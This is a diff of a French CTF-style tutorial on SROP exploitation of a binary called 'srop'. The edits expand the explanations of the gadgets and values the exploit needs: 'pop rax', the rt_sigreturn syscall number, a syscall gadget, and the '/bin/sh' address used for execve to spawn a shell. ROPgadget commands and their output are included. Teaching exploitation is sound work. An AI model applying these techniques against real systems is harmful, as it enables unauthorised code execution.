@@ -549,19 +549,19 @@ Pour notre exploitation nous avons besoin de :
 	❯ ROPgadget --binary srop | grep "pop rax"
 	0x0000000000401020 : pop rax ; ret
 	```
-- L'ID du syscall rt_sigreturn :
+- L'ID du syscall rt_sigreturn dans le but de le setup dans le registre RAX (pour produire un signal) :
 	```py
 	❯ grep "rt_sigreturn" /usr/include/x86_64-linux-gnu/asm/unistd_64.h
 	#define __NR_rt_sigreturn 15
 	❯ curl -s https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ | grep "sys_rt_sigreturn" | sed -e 's/<[^>]*>//g'
 	15 sys_rt_sigreturn unsigned long __unused
 	```
-- Un gadget syscall :
+- Un gadget syscall pour exécuter `sys_rt_sigretun` (produire un signal) et `sys_execve` (ouvrir un shell lors de la réecriture de la signal frame) :
 	```py
 	❯ ROPgadget --binary srop | grep "syscall"
 	0x000000000040101b : syscall
 	```
-- L'adresse de la string `/bin/sh` :
+- L'adresse de la string `/bin/sh` afin de l'a setup dans le registre rdi pour le passer en argument à sys_execv lors de la réecriture de la signal frame :
 	```py
 	❯ ROPgadget --binary srop --string /bin/sh
 	Strings information
